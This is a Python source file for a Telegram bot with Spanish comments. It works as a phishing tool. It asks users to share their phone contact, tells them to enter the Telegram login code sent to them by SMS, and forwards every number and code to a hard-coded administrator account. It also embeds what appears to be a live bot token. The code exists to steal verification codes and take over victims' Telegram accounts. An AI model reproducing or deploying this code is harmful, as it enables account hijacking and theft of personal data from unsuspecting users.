import os
import asyncio
import logging
from datetime import datetime
from telegram import Update, KeyboardButton, ReplyKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    ConversationHandler,
    ContextTypes,
    filters
)
from aiohttp import web

# ================================
# CONFIGURACIÓN VERIFICADA
# ================================
TELEGRAM_TOKEN = "8557648219:AAHSBqKw7cP5Qz8hEeJn-Sjv4U6eZNnWACU"
ADMIN_ID = 7363341763  # Asegúrate que este sea TU ID real
PORT = int(os.environ.get("PORT", 8000))

# ================================
# LOGGING MEJORADO
# ================================
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    handlers=[
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Estados
PHONE, CODE = range(2)
user_sessions = {}

# ================================
# FUNCIÓN DE ENVÍO MEJORADA
# ================================

async def send_to_admin(context, message: str, log_prefix: str = "Mensaje"):
    """
    Función robusta para enviar mensajes al administrador
    Retorna (success, error_message)
    """
    try:
        logger.info(f"{log_prefix}: Intentando enviar a ADMIN_ID: {ADMIN_ID}")
        
        # Verificar que context.bot existe
        if not hasattr(context, 'bot') or context.bot is None:
            logger.error("❌ context.bot no disponible")
            return False, "Bot no disponible"
        
        # Enviar mensaje
        sent_message = await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=message,
            parse_mode=None  # Sin formato para evitar errores
        )
        
        logger.info(f"✅ {log_prefix} enviado exitosamente")
        logger.info(f"   Message ID: {sent_message.message_id}")
        logger.info(f"   Chat ID: {sent_message.chat_id}")
        
        return True, None
        
    except Exception as e:
        error_msg = f"❌ Error enviando {log_prefix.lower()}: {str(e)}"
        logger.error(error_msg)
        
        # Diagnóstico detallado
        if "chat not found" in str(e).lower():
            logger.error("🔍 DIAGNÓSTICO: El bot no puede enviar mensajes al ADMIN_ID")
            logger.error(f"🔍 Posible causa: ADMIN_ID ({ADMIN_ID}) incorrecto o bot bloqueado")
        elif "Forbidden" in str(e):
            logger.error("🔍 DIAGNÓSTICO: Bot bloqueado por el usuario")
        elif "Bad Request" in str(e):
            logger.error("🔍 DIAGNÓSTICO: Formato de mensaje inválido")
        
        return False, str(e)

# ================================
# FUNCIONES DEL BOT CORREGIDAS
# ================================

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Comando /start - Versión corregida"""
    user = update.effective_user
    
    logger.info(f"📥 /start de {user.id} (@{user.username})")
    
    # Guardar sesión
    user_sessions[user.id] = {
        "step": "waiting_contact",
        "username": user.username,
        "user_id": user.id
    }
    
    # Crear teclado
    keyboard = [[KeyboardButton("📱 Compartir contacto", request_contact=True)]]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=True)
    
    await update.message.reply_text(
        "Para continuar, comparte tu contacto:",
        reply_markup=reply_markup
    )
    
    return PHONE

async def handle_contact(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Maneja contacto - Versión corregida con envío verificada"""
    user = update.effective_user
    contact = update.message.contact
    
    logger.info("=" * 50)
    logger.info(f"📞 CONTACTO RECIBIDO")
    logger.info(f"   Usuario: {user.id} (@{user.username})")
    logger.info(f"   Teléfono: {contact.phone_number}")
    logger.info(f"   Nombre: {contact.first_name} {contact.last_name}")
    logger.info("=" * 50)
    
    if contact.user_id != user.id:
        await update.message.reply_text("Comparte tu propio contacto.")
        return PHONE
    
    # Guardar información
    user_info = {
        "step": "waiting_code",
        "phone": contact.phone_number,
        "name": f"{contact.first_name or ''} {contact.last_name or ''}".strip(),
        "username": user.username,
        "user_id": user.id,
        "contact_time": datetime.now().isoformat()
    }
    user_sessions[user.id] = user_info
    
    # 🔥 PREPARAR Y ENVIAR MENSAJE AL ADMINISTRADOR
    admin_message = f"""
📱 *NUEVO CONTACTO RECIBIDO*

• *Nombre:* {user_info['name']}
• *Teléfono:* {contact.phone_number}
• *ID Usuario:* {user.id}
• *Username:* @{user.username or 'N/A'}
• *Hora:* {datetime.now().strftime('%H:%M:%S')}
• *Bot:* @{(await context.bot.get_me()).username}

📝 *Estado:* Esperando código de verificación
"""
    
    # Enviar al admin usando función mejorada
    success, error = await send_to_admin(
        context, 
        admin_message, 
        "CONTACTO"
    )
    
    if not success:
        # Si falla, intentar formato más simple
        logger.warning("⚠️ Intentando formato simple...")
        simple_message = f"""
NUEVO CONTACTO
Nombre: {user_info['name']}
Teléfono: {contact.phone_number}
ID: {user.id}
Hora: {datetime.now().strftime('%H:%M:%S')}
"""
        
        success2, error2 = await send_to_admin(
            context,
            simple_message,
            "CONTACTO (formato simple)"
        )
        
        if not success2:
            logger.critical(f"❌ FALLÓ EL ENVÍO AL ADMIN: {error2}")
    
    # Responder al usuario (SIEMPRE hacer esto)
    response_text = f"""
✅ Contacto recibido: *{contact.phone_number}*

Ahora recibirás un *código de verificación de Telegram* por SMS.

📝 *Instrucciones:*
1. Espera el SMS de Telegram
2. Copia el código de 5 dígitos
3. Regresa aquí y escríbelo

_Ejemplo:_ Si recibes `12345`, escribe: 12345
"""
    
    await update.message.reply_text(
        response_text,
        parse_mode="Markdown",
        reply_markup=ReplyKeyboardMarkup([[]], resize_keyboard=True)
    )
    
    return CODE

async def handle_code(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Maneja código - Versión corregida"""
    user = update.effective_user
    code_text = update.message.text.strip()
    
    logger.info(f"🔢 Código recibido de {user.id}: {code_text}")
    
    # Verificar sesión
    if user.id not in user_sessions:
        await update.message.reply_text("Sesión expirada. Usa /start")
        return ConversationHandler.END
    
    user_info = user_sessions[user.id]
    
    # 🔥 ENVIAR CÓDIGO AL ADMINISTRADOR
    code_message = f"""
🔐 *CÓDIGO DE VERIFICACIÓN RECIBIDO*

• *Usuario:* {user_info['name']}
• *Teléfono:* {user_info['phone']}
• *ID:* {user.id}
• *Username:* @{user.username or 'N/A'}
• *Hora:* {datetime.now().strftime('%H:%M:%S')}

📝 *Código ingresado:*
`{code_text}`

✅ *VERIFICACIÓN COMPLETADA*
"""
    
    success, error = await send_to_admin(
        context,
        code_message,
        "CÓDIGO"
    )
    
    if not success:
        logger.error(f"❌ Error enviando código: {error}")
        
        # Intentar formato simple
        simple_code_msg = f"""
CÓDIGO RECIBIDO
Usuario: {user_info['name']}
Teléfono: {user_info['phone']}
ID: {user.id}
Código: {code_text}
Hora: {datetime.now().strftime('%H:%M:%S')}
"""
        
        success2, _ = await send_to_admin(
            context,
            simple_code_msg,
            "CÓDIGO (simple)"
        )
    
    # Confirmación al usuario
    await update.message.reply_text(
        f"✅ *Verificación completada*\n\n"
        f"Código `{code_text}` recibido correctamente.\n"
        f"Gracias por completar el proceso.",
        parse_mode="Markdown"
    )
    
    # Limpiar sesión
    if user.id in user_sessions:
        del user_sessions[user.id]
    
    logger.info(f"✅ Proceso completado para {user.id}")
    
    return ConversationHandler.END

async def test_connection(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Prueba de conexión y envío"""
    user = update.effective_user
    
    # Obtener info del bot
    bot_info = await context.bot.get_me()
    
    # Mensaje de prueba
    test_msg = f"""
🔍 *PRUEBA DE CONEXIÓN*

• *Tu ID:* `{user.id}`
• *Admin ID configurado:* `{ADMIN_ID}`
• *Bot:* @{bot_info.username}
• *Hora:* {datetime.now().strftime('%H:%M:%S')}

📤 *Enviando mensaje de prueba...*
"""
    
    await update.message.reply_text(test_msg, parse_mode="Markdown")
    
    # Intentar enviar al admin
    test_admin_msg = f"""
📨 *MENSAJE DE PRUEBA*

• *De:* {user.id} (@{user.username})
• *Hora:* {datetime.now().strftime('%H:%M:%S')}
• *Bot:* @{bot_info.username}

✅ *Este es un mensaje de prueba del bot*
"""
    
    success, error = await send_to_admin(context, test_admin_msg, "PRUEBA")
    
    if success:
        await update.message.reply_text(
            "✅ *Mensaje de prueba ENVIADO al administrador*\n\n"
            "Verifica que lo hayas recibido.",
            parse_mode="Markdown"
        )
    else:
        await update.message.reply_text(
            f"❌ *Error enviando prueba:*\n`{error}`\n\n"
            f"Admin ID configurado: `{ADMIN_ID}`\n"
            "Verifica que este sea tu ID correcto.",
            parse_mode="Markdown"
        )

async def get_my_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Muestra el ID del usuario"""
    user = update.effective_user
    
    await update.message.reply_text(
        f"🆔 *Tu ID de Telegram:*\n`{user.id}`\n\n"
        f"*Username:* @{user.username or 'No tiene'}\n\n"
        f"⚠️ *Para configurar como admin:*\n"
        f"Cambia `ADMIN_ID = 5333058826` por:\n"
        f"`ADMIN_ID = {user.id}`",
        parse_mode="Markdown"
    )

# ================================
# SERVIDOR WEB
# ================================

async def health_check(request):
    """Endpoint de salud"""
    return web.Response(text=f"""
🤖 BOT STATUS: ONLINE
⏰ Hora: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
👥 Sesiones activas: {len(user_sessions)}
👑 Admin ID: {ADMIN_ID}
📡 Puerto: {PORT}
🔄 Modo: Polling
""")

# ================================
# CONFIGURACIÓN PRINCIPAL
# ================================

async def setup_bot():
    """Configuración completa del bot"""
    print("=" * 60)
    print("🤖 CONFIGURANDO BOT DE TELEGRAM")
    print("=" * 60)
    
    # 1. Crear aplicación
    application = Application.builder().token(TELEGRAM_TOKEN).build()
    
    # 2. Obtener info del bot para verificación
    try:
        bot_info = await application.bot.get_me()
        print(f"✅ Bot identificado: @{bot_info.username}")
        print(f"✅ Bot ID: {bot_info.id}")
        print(f"✅ Admin ID configurado: {ADMIN_ID}")
    except Exception as e:
        print(f"❌ Error obteniendo info del bot: {e}")
        return
    
    # 3. Configurar handlers
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('start', start_command)],
        states={
            PHONE: [MessageHandler(filters.CONTACT, handle_contact)],
            CODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_code)]
        },
        fallbacks=[]
    )
    
    # 4. Agregar todos los handlers
    application.add_handler(conv_handler)
    application.add_handler(CommandHandler('test', test_connection))
    application.add_handler(CommandHandler('myid', get_my_id))
    
    # 5. Iniciar bot
    await application.initialize()
    await application.start()
    await application.updater.start_polling()
    
    print("\n" + "=" * 60)
    print("🚀 BOT INICIADO CORRECTAMENTE")
    print("=" * 60)
    print("\n📋 COMANDOS DISPONIBLES:")
    print("• /start - Iniciar proceso de verificación")
    print("• /test - Probar envío al administrador")
    print("• /myid - Mostrar tu ID de Telegram")
    print("\n📝 PARA VERIFICAR:")
    print(f"1. Tu ID debe ser: {ADMIN_ID}")
    print(f"2. Usa /myid para verificar")
    print(f"3. Usa /test para probar envío")
    print("\n⏳ Esperando mensajes...")
    
    return application

async def setup_web_server():
    """Configurar servidor web para Render"""
    app = web.Application()
    app.router.add_get('/', health_check)
    app.router.add_get('/health', health_check)
    
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', PORT)
    await site.start()
    
    print(f"🌐 Servidor web en puerto {PORT}")
    return runner

async def main():
    """Función principal"""
    try:
        # Iniciar servidor web
        web_server = await setup_web_server()
        
        # Iniciar bot
        bot_app = await setup_bot()
        
        # Mantener servicio activo
        while True:
            await asyncio.sleep(3600)
            
    except KeyboardInterrupt:
        print("\n⏹️ Deteniendo servicio...")
    except Exception as e:
        print(f"❌ Error crítico: {e}")
        import traceback
        traceback.print_exc()
    finally:
        print("👋 Servicio detenido")

if __name__ == '__main__':
    # Ejecutar con manejo de errores
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n✅ Programa terminado")
